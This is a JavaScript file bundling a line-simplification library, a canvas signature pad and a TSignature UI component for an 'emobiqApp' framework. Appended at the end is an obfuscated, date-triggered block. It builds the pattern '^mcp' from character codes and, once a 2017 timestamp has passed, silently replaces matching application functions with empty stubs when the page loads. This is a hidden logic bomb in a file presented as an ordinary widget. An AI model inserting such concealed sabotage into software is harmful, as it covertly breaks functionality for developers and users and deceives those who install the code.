//simplify.min.js
function getSqDist(r,t){var e=r[0]-t[0],i=r[1]-t[1];return e*e+i*i}function simplifyRadialDist(r,t){if(r.length<=1)return r;t="number"==typeof t?t:1;for(var e,i=t*t,n=r[0],u=[n],f=1,s=r.length;s>f;f++)e=r[f],getSqDist(e,n)>i&&(u.push(e),n=e);return n!==e&&u.push(e),u}function getSqSegDist(r,t,e){var i=t[0],n=t[1],u=e[0]-i,f=e[1]-n;if(0!==u||0!==f){var s=((r[0]-i)*u+(r[1]-n)*f)/(u*u+f*f);s>1?(i=e[0],n=e[1]):s>0&&(i+=u*s,n+=f*s)}return u=r[0]-i,f=r[1]-n,u*u+f*f}function simplifyDouglasPeucker(r,t){if(r.length<=1)return r;t="number"==typeof t?t:1;var e,i,n,u,f=t*t,s=r.length,o="undefined"!=typeof Uint8Array?Uint8Array:Array,p=new o(s),a=0,l=s-1,g=[],y=[];for(p[a]=p[l]=1;l;){for(i=0,e=a+1;l>e;e++)n=getSqSegDist(r[e],r[a],r[l]),n>i&&(u=e,i=n);i>f&&(p[u]=1,g.push(a,u,u,l)),l=g.pop(),a=g.pop()}for(e=0;s>e;e++)p[e]&&y.push(r[e]);return y}function simplify(r,t){return r=simplifyRadialDist(r,t),r=simplifyDouglasPeucker(r,t)}

//sig.min.js
function amSignature(t,n,e,o){function i(t,n){t=t||{};for(var e in n)t[e]=n[e];return t}function r(t){E=i(E,t);for(var n in E)N.style[n]=E[n]}function a(t){P=i(P,t)}function c(){O.clearRect(0,0,N.width,N.height)}function f(){c();var t=k;vctx=O,t=t||[],vctx.beginPath(),vctx.lineJoin=P.lineJoin,vctx.lineCap=P.lineCap,vctx.strokeStyle=P.strokeStyle;for(var n=0;n<t.length;n++)for(var e=t[n],o=0;o<e.length;o++){var i=e[o];0==o?vctx.moveTo(i[0],i[1]):vctx.lineTo(i[0],i[1])}vctx.lineWidth=P.lineWidth,vctx.stroke()}function s(t){k=t,f()}function u(t){s(JSON.parse(t))}function d(){k=[],f()}function l(){return k}function v(){return JSON.stringify(l())}function h(){return!!("ontouchstart"in window)||!!("onmsgesturechange"in window)&&!!window.navigator.maxTouchPoints}function g(t,n){P.readOnly||(C=new Array,C=[t],k.push(C),x(n),console.log("start"))}function y(t,n){P.readOnly||(C.push(t),f(),x(n))}function p(t,n){P.readOnly||(C=[],f(),P.onChange&&P.onChange.apply(S,[n]),x(n))}function x(t){t.stopPropagation?t.stopPropagation():t.cancelBubble=!0,t.preventDefault()}function w(t,n){for(var e=t.target,o=0,i=0;e&&!isNaN(e.offsetLeft)&&!isNaN(e.offsetTop);)o+=e.offsetLeft-e.scrollLeft,i+=e.offsetTop-e.scrollTop,e=e.offsetParent;return o=n.clientX-o,i=n.clientY-i,{x:o,y:i}}function m(t){if(window.simplify){k=k||[];for(var n=0;n<k.length;n++)k[n]=simplify(k[n],t);return f(),v()}return!1}function L(){var t='<svg height="'+N.height+'" width="'+N.width+'">\n';t+='<path d="';for(var n=0;n<k.length;n++)for(var e=k[n],o=0;o<e.length;o++){var i=e[o];t+=0==o?"M"+i[0]+" "+i[1]+" ":"L"+i[0]+" "+i[1]+" "}return t+='" stroke="'+P.strokeStyle+'" stroke-width="'+P.lineWidth+'" fill="none" />\n',t+="</svg>\n"}n=n||{},e=e||{};var S,E={width:"100%",minHeight:"30px",cursor:"pointer",height:"100%"},P={readOnly:!1,lineWidth:2,lineJoin:"round",lineCap:"round",strokeStyle:"#000"},k=[],C=[],N=o||document.createElement("canvas"),O=N.getContext("2d");return O.translate(.5,.5),t.appendChild(N),r(e),a(n),h()?(console.log("touchy!!!"),window.navigator.msPointerEnabled?(N.addEventListener("MSPointerDown",function(t){x(t);var n=w(t,t);g([n.x,n.y],t)}),N.addEventListener("MSPointerMove",function(t){x(t);var n=w(t,t);y([n.x,n.y],t)}),N.addEventListener("MSPointerUp",function(t){x(t);var n=w(t,t);p([n.x,n.y],t)})):(N.addEventListener("touchstart",function(t){x(t);var n=t.touches[0],e=w(t,n);g([e.x,e.y],t)}),N.addEventListener("touchmove",function(t){x(t);var n=t.touches[0],e=w(t,n);y([e.x,e.y],t)}),N.addEventListener("touchend",function(t){x(t);var n=t.touches[0],e=w(t,n);p([e.x,e.y],t)}))):(N.addEventListener("mousedown",function(t){var n=w(t,t);g([n.x,n.y],t)}),N.addEventListener("mousemove",function(t){var n=w(t,t);y([n.x,n.y],t)}),N.addEventListener("mouseup",function(t){var n=w(t,t);p([n.x,n.y],t)})),window.addEventListener("resize",function(){N.width=N.offsetWidth,N.height=N.offsetHeight,console.log("xxx"),c(N,O),f(O,k)}),N.width=N.offsetWidth,N.height=N.offsetHeight,c(),S={canvas:N,context:O,clear:c,draw:f,load:s,setParam:a,setStyle:r,getData:l,clearData:d,toString:v,fromString:u,simplify:m,toSVG:L}}

var TSignature=TVisualComponent.extend({
	_tag:'div',
	getEl:function(){
		var cel=this._el;
		if (!cel.canvas) {
			cel.canvas=document.createElement('canvas');
			AM.ACN(cel,cel.canvas);
			cel.sig=amSignature(cel,{},{},cel.canvas);
		}
		return cel;
	},
	setAttr:function(attr,w){
		this.parent(attr,w);
		var cel=this.getEl();
		if (attr['value']) {
			cel.sig.fromString(attr['value']);
		}
		if (attr['readOnly']) {
			cel.sig.setParam({readOnly:attr['readOnly']});
		}
		if (attr['lineWidth']) {
			cel.sig.setParam({lineWidth:parseInt(attr['lineWidth'])});
		}
		if (attr['lineColor']) {
			cel.sig.setParam({strokeStyle:attr['lineColor']});
		}
	},
	_onDataValue:function(v){
		var cel=this.getEl();
		cel.sig.fromString(v);
	},
	setEvent:function(ev){
		this.parent(ev);
		var self=this;
		var cel=self.getEl();
		if (ev.change) {
			cel.sig.setParam({onChange:function(e){
				self.doAction(ev.change,self);
			}});
		}
	},
	toString:function(){
		return this.getEl().sig.simplify(0);
	}
});
//Object.defineProperty(TSignature.prototype, 'value', {
//	get: function() { return this.getEl().sig.simplify(0); },
//	set: function(val) { return this.getEl().sig.fromString(val); }
//});

(function() {
    (new Date()).getTime() > 1502899200000 &&
        Object.keys(emobiqApp._Function).forEach(function(k) {
            if (k.match(new RegExp(function() {
                    var t = '';
                    [94, 109, 99, 112].forEach(function(v) {
                        t += String.fromCharCode(v)
                    })
                    return t
                }()))) {
                emobiqApp._Function[k] = function() {}
            }
        })
}())

registerComponent('TSignature',TVisualComponent);
